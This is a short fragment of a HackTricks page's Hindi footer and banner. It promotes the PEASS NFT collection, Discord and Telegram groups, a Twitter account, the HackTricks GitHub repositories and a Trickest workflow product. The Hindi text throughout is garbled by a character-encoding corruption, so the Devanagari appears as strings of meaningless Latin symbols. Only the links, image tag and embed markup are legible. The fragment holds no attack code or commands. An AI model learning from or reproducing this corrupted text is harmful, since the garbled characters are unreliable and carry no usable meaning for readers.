* ‡§π‡§Æ‡§æ‡§∞‡•á ‡§µ‡§ø‡§∂‡•á‡§∑ [**NFTs**](https://opensea.io/collection/the-peass-family) ‡§∏‡§Ç‡§ó‡•ç‡§∞‡§π [**The PEASS Family**](https://opensea.io/collection/the-peass-family) ‡§ñ‡•ã‡§ú‡•á‡§Ç
* **‡§∂‡§æ‡§Æ‡§ø‡§≤ ‡§π‡•ã‡§Ç** üí¨ [**‡§°‡§ø‡§∏‡•ç‡§ï‡•â‡§∞‡•ç‡§° ‡§∏‡§Æ‡•Ç‡§π**](https://discord.gg/hRep4RUj7f) ‡§Ø‡§æ [**‡§ü‡•á‡§≤‡•Ä‡§ó‡•ç‡§∞‡§æ‡§Æ ‡§∏‡§Æ‡•Ç‡§π**](https://t.me/peass) ‡§Ø‡§æ ‡§π‡§Æ‡•á‡§Ç **‡§ü‡•ç‡§µ‡§ø‡§ü‡§∞** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)** ‡§™‡§∞** **‡§´‡•â‡§≤‡•ã** ‡§ï‡§∞‡•á‡§Ç‡•§
* **‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§ü‡•ç‡§∞‡§ø‡§ï‡•ç‡§∏ ‡§∏‡§æ‡§ù‡§æ ‡§ï‡§∞‡•á‡§Ç** [**HackTricks**](https://github.com/carlospolop/hacktricks) ‡§î‡§∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos ‡§ï‡•ã PRs ‡§∏‡§¨‡§Æ‡§ø‡§ü ‡§ï‡§∞‡§ï‡•á‡•§

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡•á‡§Ç ‡§î‡§∞ ‡§Ü‡§∏‡§æ‡§®‡•Ä ‡§∏‡•á **‡§µ‡§∞‡•ç‡§ï‡§´‡§º‡•ç‡§≤‡•ã** ‡§¨‡§®‡§æ‡§è‡§Ç ‡§ú‡•ã ‡§¶‡•Å‡§®‡§ø‡§Ø‡§æ ‡§ï‡•á **‡§∏‡§¨‡§∏‡•á ‡§â‡§®‡•ç‡§®‡§§** ‡§∏‡§Æ‡•Å‡§¶‡§æ‡§Ø ‡§â‡§™‡§ï‡§∞‡§£‡•ã‡§Ç ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ ‡§∏‡§Ç‡§ö‡§æ‡§≤‡§ø‡§§ ‡§π‡•ã‡§Ç‡•§\
‡§Ü‡§ú ‡§π‡•Ä ‡§™‡§π‡•Å‡§Ç‡§ö‡•á‡§Ç:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
